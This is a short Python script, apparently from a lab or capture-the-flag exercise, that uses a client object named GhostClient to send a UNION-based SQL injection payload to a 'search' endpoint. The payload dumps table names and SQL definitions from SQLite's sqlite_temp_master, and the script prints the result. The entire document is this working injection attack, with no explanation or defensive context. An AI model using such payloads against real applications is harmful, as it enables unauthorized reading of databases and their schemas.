from client import GhostClient

c = GhostClient()
c.bootstrap()

res = c.request("search", {"q": "' UNION SELECT 1, name, sql FROM sqlite_temp_master--"})
print("sqlite_temp_master:", res)
